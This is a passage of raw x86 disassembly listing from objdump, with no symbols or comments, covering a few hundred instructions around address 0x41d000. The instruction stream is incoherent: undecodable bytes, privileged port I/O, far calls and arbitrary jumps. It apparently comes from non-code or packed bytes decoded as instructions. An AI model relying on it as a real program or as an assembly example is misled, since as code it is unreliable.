  41d0a5:	jp     0x41d052
  41d0a7:	stc    
  41d0a8:	inc    ebx
  41d0a9:	shl    ecx,cl
  41d0ab:	and    DWORD PTR [ecx+eiz*1],ecx
  41d0ae:	pop    esp
  41d0af:	jmp    0x41d08b
  41d0b1:	or     eax,0x45b3b39f
  41d0b6:	push   edi
  41d0b7:	dec    ecx
  41d0b8:	adc    BYTE PTR [eax],cl
  41d0ba:	cmp    eax,0x96556054
  41d0bf:	sub    ah,BYTE PTR [ecx+0x35]
  41d0c2:	jg     0x41d13c
  41d0c4:	jae    0x41d057
  41d0c6:	dec    ecx
  41d0c7:	inc    edi
  41d0c8:	mov    ebp,0xd9004503
  41d0cd:	sahf   
  41d0ce:	add    bl,0x67
  41d0d1:	shl    DWORD PTR [eax+0x3ec29f2d],cl
  41d0d7:	out    dx,eax
  41d0d8:	outs   dx,DWORD PTR ds:[esi]
  41d0d9:	inc    esp
  41d0da:	inc    ebp
  41d0db:	sbb    al,0x8b
  41d0dd:	lock dec BYTE PTR [esi+ecx*1-0x62]
  41d0e2:	push   es
  41d0e3:	mov    ecx,0xcb81ba09
  41d0e8:	jnp    0x41d157
  41d0ea:	loope  0x41d14c
  41d0ec:	jl     0x41d0e6
  41d0ee:	into   
  41d0ef:	or     ecx,DWORD PTR [edi+0x58]
  41d0f2:	jb     0x41d0af
  41d0f4:	pop    es
  41d0f5:	cmp    esp,0x3afaccd7
  41d0fb:	mov    dh,0x7c
  41d0fd:	inc    edi
  41d0fe:	aas    
  41d0ff:	not    eax
  41d101:	ret    0x321d
  41d104:	test   DWORD PTR [edx],edx
  41d106:	pop    ds
  41d107:	adc    DWORD PTR [ecx+0x20],0x62152a22
  41d10e:	inc    eax
  41d10f:	daa    
  41d110:	jbe    0x41d14a
  41d112:	rcl    BYTE PTR [ebx],cl
  41d114:	xlat   BYTE PTR ds:[ebx]
  41d115:	and    cl,BYTE PTR es:[ebp-0x4d963eda]
  41d11c:	cld    
  41d11d:	lock sbb edi,DWORD PTR [esp+ecx*1-0x63]
  41d122:	js     0x41d17c
  41d124:	dec    eax
  41d125:	dec    ecx
  41d126:	dec    esi
  41d127:	jecxz  0x41d174
  41d129:	add    al,BYTE PTR [ecx-0x9830c5]
  41d12f:	jp     0x41d13b
  41d131:	call   0x54ee:0x4c4de66d
  41d138:	adc    ecx,DWORD PTR [esi]
  41d13a:	loope  0x41d16d
  41d13c:	adc    ebp,esi
  41d13e:	mov    edi,0x3ef4ee4e
  41d143:	sub    eax,0x95fdd767
  41d148:	sbb    ch,BYTE PTR [eax+0x2f819233]
  41d14e:	xor    eax,DWORD PTR [ecx]
  41d150:	xor    ch,BYTE PTR [ebx+0x6dc392c6]
  41d156:	xor    al,0x5e
  41d158:	mov    cs,esp
  41d15a:	adc    ch,BYTE PTR [eax+0x7e]
  41d15d:	mov    ds:0x48361164,eax
  41d162:	popf   
  41d163:	stos   BYTE PTR es:[edi],al
  41d164:	fstp   TBYTE PTR [ecx]
  41d166:	xchg   esi,eax
  41d167:	addr16 xchg esp,eax
  41d169:	outs   dx,DWORD PTR ds:[esi]
  41d16a:	mov    al,0x8f
  41d16c:	cmp    DWORD PTR [esi-0x58],ebx
  41d16f:	add    bh,bh
  41d171:	inc    ebp
  41d172:	and    bl,ch
  41d174:	dec    edx
  41d175:	jnp    0x41d1bf
  41d177:	cs xor ebp,ebx
  41d17a:	sbb    bh,bh
  41d17c:	cdq    
  41d17d:	adc    DWORD PTR [ecx-0x4697f556],0x320db31c
  41d187:	adc    ch,BYTE PTR [eax-0x32b2dcaf]
  41d18d:	stc    
  41d18e:	cmp    eax,0xfd353c3c
  41d193:	adc    esi,DWORD PTR [edi]
  41d195:	loopne 0x41d1a8
  41d197:	nop
  41d198:	scas   al,BYTE PTR es:[edi]
  41d199:	mov    cl,0xf
  41d19b:	and    cl,BYTE PTR [edi]
  41d19d:	(bad)  
  41d19e:	sbb    eax,0x16fcb657
  41d1a3:	mov    ebx,0xe99179c1
  41d1a8:	fmulp  st(1),st
  41d1aa:	or     bl,BYTE PTR [eax]
  41d1ac:	or     BYTE PTR [eax],cl
  41d1ae:	sti    
  41d1af:	push   ecx
  41d1b0:	shr    DWORD PTR [ecx],cl
  41d1b2:	xor    eax,0x55c03613
  41d1b7:	push   ecx
  41d1b8:	pop    ebp
  41d1b9:	(bad)  
  41d1ba:	and    al,0xf6
  41d1bc:	je     0x41d182
  41d1be:	adc    ch,dl
  41d1c0:	mov    al,0xc6
  41d1c2:	push   esi
  41d1c3:	out    dx,al
  41d1c4:	or     ecx,ebx
  41d1c6:	ins    DWORD PTR es:[edi],dx
  41d1c7:	mov    ebx,0xd9013794
  41d1cc:	ins    BYTE PTR es:[edi],dx
  41d1cd:	iret   
  41d1ce:	jp     0x41d178
  41d1d0:	sbb    BYTE PTR [edx-0x48b370ef],ah
  41d1d6:	ror    DWORD PTR [esi-0x1e9bbf26],cl
  41d1dc:	push   0x4fb2449c
  41d1e1:	mov    eax,0x2decd450
  41d1e6:	leave  
  41d1e7:	cdq    
  41d1e8:	mov    ds:0x89d68468,al
  41d1ed:	and    edx,esi
  41d1ef:	aad    0x95
  41d1f1:	jb     0x41d1a4
  41d1f3:	add    DWORD PTR [edi-0x44dc6dd6],eax
  41d1f9:	or     DWORD PTR [edi-0x33f521d4],ecx
  41d1ff:	in     eax,dx
  41d200:	inc    esi
  41d201:	push   ebp
  41d202:	cmp    DWORD PTR [ebx-0x40],edx
  41d205:	dec    ecx
  41d206:	jg     0x41d243
  41d208:	sti    
  41d209:	pushf  
  41d20a:	mov    ecx,0x60575962
  41d20f:	pop    esp
  41d210:	ret    
  41d211:	push   ds
  41d212:	and    ebp,DWORD PTR [ebx]
  41d214:	prefetch BYTE PTR [ebx+eiz*1-0x65]
  41d219:	push   eax
  41d21a:	repz jnp 0x41d204
  41d21d:	mov    bh,0x3
  41d21f:	add    esi,ecx
  41d221:	fisttp DWORD PTR [edi]
  41d223:	es aad 0xd2
  41d226:	rol    ebx,cl
  41d228:	mov    bh,BYTE PTR [ebx-0x6538dbeb]
  41d22e:	jl     0x41d206
  41d230:	mov    bl,0xc6
  41d232:	mov    edi,0x164bdf2f
  41d237:	dec    esp
  41d238:	or     eax,esp
  41d23a:	mov    ebp,0x5386f5b3
  41d23f:	inc    eax
  41d240:	sub    bl,al
  41d242:	and    esi,DWORD PTR [ebp+0x1a]
  41d245:	push   esi
  41d246:	cld    
  41d247:	lods   eax,DWORD PTR ds:[esi]
  41d248:	or     al,0x9d
  41d24a:	sbb    cl,BYTE PTR [eax-0x3daaddf]
  41d250:	cmp    BYTE PTR fs:0x41abcc0f,0x6f
  41d258:	aam    0xc4
  41d25a:	xchg   esi,eax
  41d25b:	out    dx,al
  41d25c:	inc    edi
  41d25d:	int3   
  41d25e:	(bad)  
  41d25f:	int    0x13
  41d261:	mov    ds:0xd3d37eb,al
  41d266:	ins    DWORD PTR es:[edi],dx
  41d267:	xchg   esp,eax
  41d268:	pop    ecx
  41d269:	mov    ebx,0xd7ec3038
  41d26e:	add    eax,0x71ef7f74
  41d273:	adc    al,0x72
  41d275:	in     al,dx
  41d276:	out    0x10,al
  41d278:	sti    
  41d279:	mov    bh,0x3a
  41d27b:	sub    al,0x49
  41d27d:	or     DWORD PTR [ebx+0x582a390c],esp
  41d283:	add    ch,BYTE PTR [edi]
  41d285:	mov    cl,0xe9
  41d287:	adc    esp,DWORD PTR ds:0x3f375095
  41d28d:	pop    ebp
  41d28e:	inc    edi
  41d28f:	out    dx,al
  41d290:	mov    ds:0xddbc8298,eax
  41d295:	out    dx,al
  41d296:	fdivr  DWORD PTR [edi-0x7b94932e]
  41d29c:	sub    BYTE PTR [ebp+0x70],ah
  41d29f:	shl    BYTE PTR [esi+eax*4-0x7a],1
  41d2a3:	sbb    al,0x19
  41d2a5:	sub    al,0x44
  41d2a7:	cmp    bl,al
  41d2a9:	or     dl,BYTE PTR [ebp+0x7b2f77a3]
  41d2af:	jnp    0x41d302
  41d2b1:	or     esp,esp
  41d2b3:	frstor [eax+esi*1]
  41d2b6:	xor    ebx,DWORD PTR [ebx]
  41d2b8:	fisttp QWORD PTR [ebp+0x7c1f613f]
  41d2be:	repnz es cmp bl,dl
  41d2c2:	jne    0x41d25d
  41d2c4:	icebp  
  41d2c5:	and    BYTE PTR [ebp-0x364f66b7],dl
  41d2cb:	call   0xfc81:0x6c1bf565
  41d2d2:	adc    DWORD PTR ds:0xc76fe59,ecx
  41d2d8:	mov    WORD PTR [ecx],cs
  41d2da:	mov    ecx,0x73a1aed3
  41d2df:	outs   dx,BYTE PTR ds:[esi]
  41d2e0:	rcr    BYTE PTR [edi-0x52],cl
  41d2e3:	jl     0x41d2f4
  41d2e5:	icebp  
  41d2e6:	daa    
  41d2e7:	call   0x66627a30
  41d2ec:	pop    ecx
  41d2ed:	loope  0x41d284
  41d2ef:	xor    esp,edi
  41d2f1:	sbb    ebp,esp
  41d2f3:	mov    edx,0x6cf512a5
  41d2f8:	pop    ds
  41d2f9:	mov    BYTE PTR [eax-0x4038a37f],bh
  41d2ff:	mov    bh,bh
  41d301:	push   ds
  41d302:	aaa    
  41d303:	rcl    BYTE PTR [esi],cl
  41d305:	jne    0x41d2e3
  41d307:	sub    al,0x33
  41d309:	(bad)  
  41d30a:	adc    bl,ah
  41d30c:	dec    esp
  41d30d:	jecxz  0x41d299
  41d30f:	popf   
  41d310:	pop    ss
  41d311:	into   
  41d312:	rol    DWORD PTR [ecx+0x10],1
  41d315:	xchg   edi,eax
  41d316:	mov    ds:0x5b09d256,al
  41d31b:	test   dl,bl
  41d31d:	and    eax,0xbb6c53ba
  41d322:	mov    bh,0x7
  41d324:	adc    esp,DWORD PTR [ebx-0x563fa4c7]
  41d32a:	mov    ds:0x7d1e768f,al
  41d330:	xlat   BYTE PTR ds:[ebx]
  41d331:	clc    
  41d332:	out    dx,al
  41d333:	xor    eax,0xb651e071
  41d338:	or     al,0xfc
  41d33a:	pop    edi
  41d33b:	(bad)  
  41d33c:	mov    ebx,0xc328b46d
  41d341:	iret   
  41d342:	daa    
  41d343:	pop    ebx
  41d344:	pop    ebp
  41d345:	shl    DWORD PTR [edi],1
  41d347:	clc    
  41d348:	aam    0x79
  41d34a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d34b:	cmp    al,BYTE PTR [ecx]
  41d34d:	or     DWORD PTR [esi+esi*1-0x1b762fb5],edx
  41d354:	add    esi,esi
  41d356:	leave  
  41d357:	sub    eax,0x72286a82
  41d35c:	lds    eax,FWORD PTR [ebx+0x40240d83]
  41d362:	aad    0x54
  41d364:	loope  0x41d341
  41d366:	popa   
  41d367:	rol    BYTE PTR [edi-0x5df27334],0xce
  41d36e:	mov    edx,0xe366d893
  41d373:	repz call FWORD PTR [ecx]
  41d376:	xor    al,0xb8
  41d378:	mov    ebx,0x876db8ad
  41d37d:	rcr    BYTE PTR [edi+0x5f],1
  41d380:	imul   DWORD PTR [edx-0x80]
  41d383:	xor    BYTE PTR [edi+0x4d],dh
  41d386:	icebp  
  41d387:	mov    dh,0xcf
  41d389:	mov    eax,0x1319972
  41d38e:	arpl   di,bx
  41d390:	xlat   BYTE PTR ds:[ebx]
  41d391:	lds    ebp,FWORD PTR [ebx-0x6f0cf268]
  41d397:	xor    al,0x5b
  41d399:	mov    ebx,0x8d7d32bc
  41d39e:	aam    0xec
  41d3a0:	xor    al,al
  41d3a2:	dec    ebp
  41d3a3:	bound  eax,QWORD PTR [eax-0x699bed5f]
  41d3a9:	add    eax,0x3b5006d
  41d3ae:	adc    esp,DWORD PTR [ebp-0xb3f2167]
  41d3b4:	addr16 jb 0x41d3a7
  41d3b7:	mov    ecx,0xa5a96454
  41d3bc:	aaa    
  41d3bd:	aad    0xc7
  41d3bf:	and    eax,0x86901d86
  41d3c4:	push   ds
  41d3c5:	test   DWORD PTR [esi-0x73ec1e5b],esp
  41d3cb:	or     DWORD PTR [edi+0x25ba294e],ecx
  41d3d1:	sub    DWORD PTR [edx+0x37],eax
  41d3d4:	and    ah,BYTE PTR [edx+eiz*4]
  41d3d7:	shl    BYTE PTR [edi+0x4a2a3dc2],1
  41d3dd:	iret   
  41d3de:	inc    edx
  41d3df:	pop    edx
  41d3e0:	sti    
  41d3e1:	stc    
  41d3e2:	cwde   
  41d3e3:	sahf   
  41d3e4:	out    0xf1,eax
  41d3e6:	ins    DWORD PTR es:[edi],dx
  41d3e7:	gs mov ebx,eax
  41d3ea:	pop    ss
  41d3eb:	stc    
  41d3ec:	retf   0x24a2
  41d3ef:	pop    ds
  41d3f0:	jl     0x41d38d
  41d3f2:	xchg   esi,edx
  41d3f4:	in     eax,0xa0
  41d3f6:	mov    ch,cl
  41d3f8:	sub    al,0x27
  41d3fa:	call   0x87d5:0xea594df4
  41d401:	arpl   WORD PTR [edx],ax
  41d403:	and    edx,DWORD PTR [ebp+0x2f49292f]
  41d409:	add    eax,0xea5092da
  41d40e:	pop    ecx
  41d40f:	sub    ah,bl
  41d411:	pop    edi
  41d412:	out    0x2d,al
  41d414:	stos   DWORD PTR es:[edi],eax
  41d415:	call   0xb505a4de
  41d41a:	pop    esi
  41d41b:	add    eax,0xb2645e8d
  41d420:	mov    WORD PTR [ecx-0x4044e5d8],ss
  41d426:	inc    ebp
  41d427:	inc    edx
  41d428:	(bad)  
  41d42a:	add    ebx,DWORD PTR [eax]
  41d42c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d42d:	dec    esi
  41d42e:	push   0x26
  41d430:	sbb    BYTE PTR [edi+0x3b6ad951],dl
  41d436:	mov    ch,0x21
  41d438:	ds lock data16 jg 0x41d462
  41d43d:	dec    esp
  41d43e:	mov    esp,?
  41d440:	push   ebp
  41d441:	leave  
  41d442:	inc    ecx
  41d443:	sub    eax,0x44251579
  41d448:	xchg   ebx,eax
  41d449:	addr16 or al,0xee
  41d44c:	xor    DWORD PTR [eax-0x59],ecx
  41d44f:	stos   BYTE PTR es:[edi],al
  41d450:	jmp    0xe7c6:0xa9b59ad9
  41d457:	jmp    0x41d40b
  41d459:	out    0x4b,eax
  41d45b:	cmp    ecx,DWORD PTR [eax]
  41d45d:	rol    BYTE PTR [ecx],0x7b
  41d460:	jecxz  0x41d3fb
  41d462:	aaa    
  41d463:	jno    0x41d460
  41d465:	bound  eax,QWORD PTR [esp+ecx*2+0x2c512ae3]
  41d46c:	mov    dh,0x62
  41d46e:	aaa    
  41d46f:	cmp    al,BYTE PTR [edx]
  41d471:	pushf  
  41d472:	mov    BYTE PTR [ebx+0x79],dh
  41d475:	inc    edx
  41d476:	add    DWORD PTR [esi+0xf933905],0xf303db6b
  41d480:	xchg   ecx,eax
  41d481:	andnps xmm4,XMMWORD PTR [eax-0x5e]
  41d485:	jne    0x41d426
  41d487:	and    DWORD PTR [edi],esp
  41d489:	inc    esp
  41d48a:	and    dl,BYTE PTR ss:0xf0ee8e26
  41d491:	xchg   esi,eax
  41d492:	jo     0x41d4c7
  41d494:	pop    esi
  41d495:	daa    
  41d496:	jge    0x41d4cd
  41d498:	pop    edx
  41d499:	shl    DWORD PTR [eax+eiz*2+0x7c],cl
  41d49d:	enter  0xfc51,0x3d
  41d4a1:	mov    ah,0xbf
  41d4a3:	aas    
  41d4a4:	arpl   WORD PTR [edi-0x328202bd],di
  41d4aa:	data16 mov dh,0x94
  41d4ad:	mov    edx,0x82fc2055
  41d4b2:	(bad)  
  41d4b3:	mov    BYTE PTR [ebx+ebx*4+0x3168a464],bh
  41d4ba:	mov    DWORD PTR [edx-0x732a08fc],ecx
  41d4c0:	cmp    ebp,DWORD PTR es:0x434274e8
  41d4c7:	sub    al,0x8e
  41d4c9:	xchg   ecx,eax
  41d4ca:	add    eax,0xe0e03c85
  41d4cf:	jle    0x41d4bc
  41d4d1:	lahf   
  41d4d2:	in     al,0x7b
  41d4d4:	or     bl,BYTE PTR [esi+ecx*8]
  41d4d7:	(bad)  
  41d4d8:	jnp    0x41d4b9
  41d4da:	aam    0xc3
  41d4dc:	cmp    ebx,edi
  41d4de:	sub    BYTE PTR ds:0x84075543,bh
  41d4e4:	lock test eax,0x520ea3e5
  41d4ea:	repnz call 0xdada:0xc8f1acac
  41d4f2:	(bad)  [edi-0x6ab05d0d]
  41d4f8:	aam    0x5d
  41d4fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4fb:	popf   
  41d4fc:	mov    ebp,0x8924d387
  41d501:	imul   esp,edi,0x39
  41d504:	mov    eax,DWORD PTR [edx]
  41d506:	mov    eax,ds:0xf8609c46
  41d50b:	mov    cl,0x4b
  41d50d:	retf   0xfa4b
  41d510:	call   0x83863a04
  41d515:	pop    edx
  41d516:	dec    ebx
  41d517:	ficomp WORD PTR [eax]
  41d519:	xchg   esi,eax
  41d51a:	test   eax,0xa26f3354
  41d51f:	stos   DWORD PTR es:[edi],eax
  41d520:	pop    ebx
  41d521:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d522:	in     eax,dx
  41d523:	add    cl,0x4c
  41d526:	stos   BYTE PTR es:[edi],al
  41d527:	mov    bh,al
  41d529:	test   eax,0x8cf12489
  41d52e:	pop    es
  41d52f:	sbb    eax,0x6549ecce
  41d534:	sbb    esp,DWORD PTR [edx+eax*8]
  41d537:	xchg   ebp,eax
  41d538:	lock test edi,0x6ea24fc3
  41d53f:	ins    DWORD PTR es:[edi],dx
  41d540:	in     eax,dx
  41d541:	mov    esi,0xe81eeb32
  41d546:	jmp    0xb01de66f
  41d54b:	jns    0x41d551
  41d54d:	addr16 push eax
  41d54f:	aam    0xe7
  41d551:	pop    ebx
  41d552:	mov    bh,0x5c
  41d554:	les    edx,FWORD PTR [ecx]
  41d556:	or     eax,0x2e9ba4d2
  41d55b:	pop    es
  41d55c:	jle    0x41d5d0
  41d55e:	xchg   esi,eax
  41d55f:	cli    
  41d560:	nop
  41d561:	and    eax,0x3bedc602
  41d566:	or     eax,0x337ed6de
  41d56b:	pop    edx
  41d56c:	mov    ecx,0x85d47a2
  41d572:	cmp    al,BYTE PTR [eax]
  41d574:	call   0x2da1:0xfaac4f1c
  41d57b:	stos   BYTE PTR es:[edi],al
  41d57c:	cmp    ebp,DWORD PTR [ecx-0x11]
  41d57f:	out    dx,eax
  41d580:	xor    al,0x7a
  41d582:	in     eax,dx
  41d583:	lahf   
  41d584:	jmp    DWORD PTR [ebp+ebx*8-0x4a]
  41d588:	outs   dx,BYTE PTR ds:[esi]
  41d589:	xchg   ecx,eax
  41d58a:	cmc    
  41d58b:	sbb    eax,0xa0fe94e6
  41d590:	pushf  
  41d591:	out    dx,eax
  41d592:	cwde   
  41d593:	sbb    eax,0xce2d2fff
  41d598:	(bad)  
  41d599:	sub    BYTE PTR [ecx+0x1f759cfd],cl
  41d59f:	out    dx,al
  41d5a0:	mov    DWORD PTR [edx],ebx
  41d5a2:	ins    DWORD PTR es:[edi],dx
  41d5a3:	ins    DWORD PTR es:[edi],dx
  41d5a4:	ins    BYTE PTR es:[edi],dx
  41d5a5:	pslld  mm4,QWORD PTR [edi]
  41d5a8:	sub    edi,DWORD PTR [edi]
  41d5aa:	xor    BYTE PTR [esi],ch
  41d5ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5ad:	stos   BYTE PTR es:[edi],al
  41d5ae:	lods   eax,DWORD PTR ds:[esi]
  41d5af:	sahf   
  41d5b0:	js     0x41d5c5
  41d5b2:	jae    0x41d5ff
  41d5b4:	ja     0x41d591
  41d5b6:	scas   eax,DWORD PTR es:[edi]
  41d5b7:	mov    ch,0x3c
  41d5b9:	add    eax,0xae5f49a6
  41d5be:	dec    ecx
  41d5bf:	hlt    
  41d5c0:	dec    esi
  41d5c1:	mov    esi,DWORD PTR [eax+0x71]
  41d5c4:	je     0x41d5fd
  41d5c6:	sub    eax,0xd38fc44b
  41d5cb:	jne    0x41d58d
  41d5cd:	iret   
  41d5ce:	push   ds
  41d5cf:	xor    eax,0x957e5b0
  41d5d4:	int3   
  41d5d5:	jbe    0x41d58f
  41d5d7:	cmc    
  41d5d8:	test   eax,0xf4afab2f
  41d5dd:	pop    esi
  41d5de:	adc    bh,ch
  41d5e0:	ror    DWORD PTR [esi+eiz*4-0x3993a020],cl
  41d5e7:	jmp    DWORD PTR [edx-0x6f2668e2]
  41d5ed:	js     0x41d589
  41d5ef:	push   ds
  41d5f0:	retf   0x363b
  41d5f3:	popf   
  41d5f4:	retf   0xebf3
  41d5f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5f8:	fnsave [ebp-0x1e062c89]
  41d5fe:	test   DWORD PTR [ecx-0x7f67252f],esp
  41d604:	push   0x6e10d0d9
  41d609:	ss dec ebp
  41d60b:	pop    esp
  41d60c:	fld    st(6)
  41d60e:	in     eax,dx
  41d60f:	xchg   BYTE PTR [ebx+0x1a],al
  41d612:	xchg   esp,eax
  41d613:	(bad)  
  41d614:	xlat   BYTE PTR ds:[ebx]
  41d615:	mov    al,ds:0xcb0db959
  41d61a:	cmp    al,0x66
  41d61c:	add    dh,bh
  41d61e:	stc    
  41d61f:	xchg   ebx,eax
  41d620:	mov    eax,DWORD PTR [ecx+0x35]
  41d623:	inc    esi
  41d624:	sub    BYTE PTR [eax+edx*2],0x7b
  41d628:	repz daa 
  41d62a:	inc    edi
  41d62b:	push   ebp
  41d62c:	ret    
  41d62d:	stos   BYTE PTR es:[edi],al
  41d62e:	sbb    cl,cl
  41d630:	mov    es,WORD PTR [eax]
  41d632:	xchg   edx,eax
  41d633:	retf   0xe328
  41d636:	pop    esi
  41d637:	dec    BYTE PTR [esp+eax*1-0x5206b62d]
  41d63e:	jmp    0x41d5ce
  41d640:	test   eax,0x762d3a1a
  41d645:	xchg   esp,eax
  41d646:	mov    eax,ds:0xb80334e2
  41d64b:	aas    
  41d64c:	ret    
  41d64d:	add    edi,DWORD PTR [ecx-0xc]
  41d650:	lea    ecx,[ebp+0x468b2ff7]
  41d656:	ja     0x41d5db
  41d658:	mov    ecx,0x62bae0a9
  41d65d:	clc    
  41d65e:	xchg   edx,eax
  41d65f:	dec    edx
  41d660:	cmp    al,0x68
  41d662:	lods   al,BYTE PTR ds:[esi]
  41d663:	push   0x880e6078
  41d668:	cli    
  41d669:	add    eax,0xffffffad
  41d66c:	cwde   
  41d66d:	cmp    al,0xa2
  41d66f:	in     al,dx
  41d670:	cmp    BYTE PTR [eax],al
  41d672:	inc    esp
  41d673:	jecxz  0x41d6dd
  41d675:	or     dh,0x75
  41d678:	mov    bh,0x95
  41d67a:	loop   0x41d648
  41d67c:	push   esp
  41d67d:	dec    esp
  41d67e:	(bad)  
  41d67f:	scas   eax,DWORD PTR es:[edi]
  41d680:	enter  0x47ea,0xed
  41d684:	push   0x43
  41d686:	xchg   BYTE PTR [edi+0x2251b57],cl
  41d68c:	mov    ebp,0xa42ba13d
  41d691:	mov    al,0xe2
  41d693:	pusha  
  41d694:	xor    DWORD PTR [edi+0xc],ebp
  41d697:	ins    DWORD PTR es:[edi],dx
  41d698:	adc    bl,dh
  41d69a:	mov    ah,0x9
  41d69c:	mov    dl,0x22
  41d69e:	push   cs
  41d69f:	imul   ecx,DWORD PTR [edx+0x10],0xffffffad
  41d6a3:	add    al,0x24
  41d6a5:	jmp    0x41d700
  41d6a7:	icebp  
  41d6a8:	cli    
  41d6a9:	int    0x4a
  41d6ab:	test   al,0x2f
  41d6ad:	and    al,0x9e
  41d6af:	sbb    edi,DWORD PTR [esi]
  41d6b1:	xchg   esp,eax
  41d6b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6b3:	mov    dh,0xce
  41d6b5:	add    BYTE PTR [esi],ah
  41d6b7:	push   ds
  41d6b8:	push   ss
  41d6b9:	xchg   ebp,eax
  41d6ba:	fucomp st(2)
  41d6bc:	ret    0xf469
  41d6bf:	add    BYTE PTR [ecx],ch
  41d6c1:	jb     0x41d67d
  41d6c3:	cmp    esi,ecx
  41d6c5:	pop    eax
  41d6c6:	ins    DWORD PTR es:[edi],dx
  41d6c7:	mov    eax,ds:0x8f938167
  41d6cc:	fmul   DWORD PTR [ebx+0x1f]
  41d6cf:	shr    DWORD PTR [ebx+0x5651f2d],0xb7
  41d6d6:	mov    esi,0xf72aace7
  41d6db:	in     eax,dx
  41d6dc:	push   eax
  41d6dd:	sub    al,0x54
  41d6df:	and    eax,0xa594cb1d
  41d6e4:	in     eax,0x78
  41d6e6:	in     eax,0xf0
  41d6e8:	cmp    al,0x92
  41d6ea:	jbe    0x41d760
  41d6ec:	mov    ds:0x90a26dff,al
  41d6f1:	ror    ebx,1
  41d6f3:	mov    ch,0x33
  41d6f5:	cwde   
  41d6f6:	and    DWORD PTR [ebp-0x745be7c5],ecx
  41d6fc:	test   BYTE PTR [esi-0x415a700e],ah
  41d702:	jae    0x41d6bf
  41d704:	leave  
  41d705:	add    DWORD PTR [ebp-0x6d4f75d],ebp
  41d70b:	js     0x41d72b
  41d70d:	xor    BYTE PTR [esi],ch
  41d70f:	fidivr WORD PTR [esi]
  41d711:	sub    ebp,edx
  41d713:	or     DWORD PTR [edx+0x2b39f6d6],esp
  41d719:	jb     0x41d791
  41d71b:	test   BYTE PTR [edx+ebp*4-0x6f],dl
  41d71f:	jae    0x41d71d
  41d721:	and    al,0xe1
  41d723:	pop    edi
  41d724:	sbb    DWORD PTR [eax+0x7c94fa39],esi
  41d72a:	ficomp DWORD PTR [ebp+0x34]
  41d72d:	adc    ebx,DWORD PTR ds:0x6519194e
  41d733:	aas    
  41d734:	enter  0x9d80,0x12
  41d738:	mov    bl,0xb
  41d73a:	dec    ecx
  41d73b:	call   0xbe12a74a
  41d740:	out    dx,eax
  41d741:	sbb    DWORD PTR [esi-0x66aa413f],esp
  41d747:	lahf   
  41d748:	mov    DWORD PTR [eax],esi
  41d74a:	xor    bh,BYTE PTR [esi]
  41d74c:	push   cs
  41d74d:	fadd   st(6),st
  41d74f:	pop    ss
  41d750:	push   0xb
  41d752:	sub    eax,0x8d378325
  41d757:	icebp  
  41d758:	dec    esi
  41d759:	sbb    DWORD PTR [ecx+0x58],0x7a
  41d75d:	arpl   WORD PTR [ecx+eiz*4+0x2e897548],bx
  41d764:	pop    ss
  41d765:	fistp  DWORD PTR [edi+0x0]
  41d768:	pop    es
  41d769:	test   BYTE PTR [ecx],0x0
  41d76c:	add    al,0x2a
  41d76e:	xor    al,0xd2
  41d770:	pop    esp
  41d771:	xchg   ebp,eax
  41d772:	or     DWORD PTR [ecx+0x23],eax
  41d775:	mov    ds:0xd3ef0eb9,eax
  41d77a:	fbstp  TBYTE PTR cs:[esi+0x38293126]
  41d781:	cmp    dh,ah
  41d783:	dec    ebx
  41d784:	outs   dx,DWORD PTR ds:[esi]
  41d785:	mov    ch,0xc0
  41d787:	cmp    ebx,0xffffffbd
  41d78a:	sub    ecx,DWORD PTR [ecx-0x3]
  41d78d:	dec    esp
  41d78e:	sub    al,0x11
  41d790:	cmp    ah,dh
  41d792:	add    eax,esi
  41d794:	inc    ecx
  41d795:	popa   
  41d796:	add    al,0x60
  41d798:	imul   edi,DWORD PTR [ecx+0x32526b14],0xaa5e6b34
  41d7a2:	lds    ebp,FWORD PTR [eax]
  41d7a4:	jge    0x41d76f
  41d7a6:	mov    cl,BYTE PTR [esp+edx*1]
  41d7a9:	jge    0x41d76b
  41d7ab:	ja     0x41d787
  41d7ad:	pop    edi
  41d7ae:	mov    bh,ah
  41d7b0:	ss and al,0xc3
  41d7b3:	push   ds
  41d7b4:	fnsave [edi+ebx*2]
  41d7b7:	cli    
  41d7b8:	xor    al,0x9c
  41d7ba:	push   cs
  41d7bb:	add    eax,0xc8128b36
  41d7c0:	and    eax,0xe6e62c7e
  41d7c5:	or     DWORD PTR [ecx-0x19f64be8],esi
  41d7cb:	out    0x21,al
  41d7cd:	test   BYTE PTR [edx-0x74],ch
  41d7d0:	stos   DWORD PTR es:[edi],eax
  41d7d1:	sbb    eax,0x5abf90ab
  41d7d6:	jmp    0x64950ebc
  41d7db:	jg     0x41d7dd
  41d7dd:	jo     0x41d7e7
  41d7df:	test   al,0x57
  41d7e1:	stos   BYTE PTR es:[edi],al
  41d7e2:	add    bl,BYTE PTR [edi+0x7f93c791]
  41d7e8:	or     ebp,ebx
  41d7ea:	mov    bh,0x62
  41d7ec:	adc    DWORD PTR [ebx-0x6c6a3113],esp
  41d7f2:	(bad)  
  41d7f3:	push   esp
  41d7f4:	js     0x41d7b7
  41d7f6:	sub    bl,cl
  41d7f8:	fmul   QWORD PTR [ebp+0x5e]
  41d7fb:	and    al,0x60
  41d7fd:	ror    DWORD PTR [edx-0x8],cl
  41d800:	jno    0x41d793
  41d802:	pusha  
  41d803:	xchg   esp,eax
  41d804:	push   cs
  41d805:	add    ebx,esp
  41d807:	xchg   edi,eax
  41d808:	bound  esi,QWORD PTR ds:0x52fe0992
  41d80e:	sar    BYTE PTR [esi+0x7c],cl
  41d811:	icebp  
  41d812:	jo     0x41d879
  41d814:	aad    0xe4
  41d816:	and    al,0x72
  41d818:	xchg   esi,eax
  41d819:	lahf   
  41d81a:	or     bh,ch
  41d81c:	xchg   ebx,eax
  41d81d:	(bad)  
  41d81e:	ds mov al,0xf5
  41d821:	add    DWORD PTR [ecx+0x5effa984],eax
  41d827:	mov    bh,0xe4
  41d829:	push   esi
  41d82a:	fist   WORD PTR [eax-0x32]
  41d82d:	or     al,ah
  41d82f:	test   eax,0x5189db41
  41d834:	iret   
  41d835:	mov    WORD PTR [edi],ds
  41d837:	jecxz  0x41d7e9
  41d839:	daa    
  41d83a:	aam    0xb5
  41d83c:	mov    ds:0xc0631f13,al
  41d841:	xchg   esi,eax
  41d842:	pusha  
  41d843:	fcom   st(4)
